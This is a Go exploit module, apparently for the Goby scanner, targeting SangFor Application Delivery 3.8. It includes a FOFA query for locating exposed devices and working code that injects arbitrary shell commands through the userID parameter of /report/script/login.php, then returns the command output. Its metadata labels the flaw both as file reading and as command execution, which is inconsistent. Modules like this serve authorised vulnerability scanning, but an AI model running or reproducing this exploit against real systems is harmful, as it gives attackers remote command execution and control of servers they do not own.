package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "SangFor Application Delivery login.php File Command Execution Vulnerability",
    "Description": "<p>Deep convinced application delivery can provide users with a comprehensive solution including multi-data center load balancing, multi-link load balancing and server load balancing. It not only realizes the real-time monitoring of the status of each data center, link and server, but also assigns the user's access request to the corresponding data center, link and server according to the preset rules, so as to realize the reasonable distribution of data flow and make full use of all data centers, links and servers. The 3.8 version /report/script/login. PHP file has arbitrary file reading vulnerability, through which the attacker can arbitrarily execute the code on the server side, write the back door, obtain the server permission, and then control the whole Web server.</p>",
    "Impact": "<p>The 3.8 version /report/script/login. PHP file has arbitrary file reading vulnerability, through which the attacker can arbitrarily execute the code on the server side, write the back door, obtain the server permission, and then control the whole Web server.</p>",
    "Recommendation": "<p>Vendor has released leaks fixes, please pay attention to update: <a href=\"https://www.sangfor.com.cn\">https://www.sangfor.com.cn</a></p>",
    "Product": "SangFor Application Delivery",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "深信服应用交付报表系统 login.php 文件远程命令执行漏洞",
            "Product": "深信服 应用交付报表系统",
            "Description": "<p>深信服应用交付 AD 能够为用户提供包括多数据中心负载均衡、多链路负载均衡、服务器负载均衡的全方位解决方案。不仅实现对各个数据中心、链路以及服务器状态的实时监控，同时根据预设规则，将用户的访问请求分配给相应的数据中心、 链路以及服务器，进而实现数据流的合理分配，使所有的数据中心、链路和服务器都得到充分利用。其中3.8版本 /report/script/login.php 文件存在任意文件读取漏洞，<span style=\"font-size: 16px;\">攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</span><br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：&nbsp;<a href=\"https://www.sangfor.com.cn\">https://www.sangfor.com.cn</a><br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\"><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">深信服应用交付 AD&nbsp;</span>3.8版本 /report/script/login.php 文件存在任意文件读取漏洞，</span><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</span><br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "SangFor Application Delivery login.php File Command Execution Vulnerability",
            "Product": "SangFor Application Delivery",
            "Description": "<p>Deep convinced application delivery can provide users with a comprehensive solution including multi-data center load balancing, multi-link load balancing and server load balancing. It not only realizes the real-time monitoring of the status of each data center, link and server, but also assigns the user's access request to the corresponding data center, link and server according to the preset rules, so as to realize the reasonable distribution of data flow and make full use of all data centers, links and servers. The 3.8 version /report/script/login. PHP file has arbitrary file reading vulnerability, through which the attacker can arbitrarily execute the code on the server side, write the back door, obtain the server permission, and then control the whole Web server.<br></p>",
            "Recommendation": "<p>Vendor has released leaks fixes, please pay attention to update: <a href=\"https://www.sangfor.com.cn\">https://www.sangfor.com.cn</a><br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">The 3.8 version /report/script/login. PHP file has arbitrary file reading vulnerability, through which the attacker can arbitrarily execute the code on the server side, write the back door, obtain the server permission, and then control the whole Web server.</span><br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "title=\"ad.sangfor.com\"",
    "GobyQuery": "title=\"ad.sangfor.com\"",
    "Author": "1171373465@qq.com",
    "Homepage": "https://www.sangfor.com.cn/product-and-solution/sangfor-its/5?utm_source=baidu&utm_medium=cpc&utm_campaign=%E4%BA%A7%E5%93%81-%E6%96%B0IT-AD&utm_content=%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98-%E6%A0%B8%E5%BF%83%E8%AF%8D&utm_term=%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%B3%BB%E7%BB%9F&bd_vid=9811747945155761359",
    "DisclosureDate": "2022-03-23",
    "References": [
        "https://fofa.info"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "10.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "Cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10358"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randHex := goutils.RandomHexString(16)
			uri := "/report/script/login.php?userID=admin;echo%20" + randHex + ";&userPsw=admin"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.RawBody, randHex)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["Cmd"].(string)
			cmd = strings.Replace(cmd, " ", "%20", -1)
			uri := "/report/script/login.php?userID=admin;" + cmd + ";&userPsw=admin"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
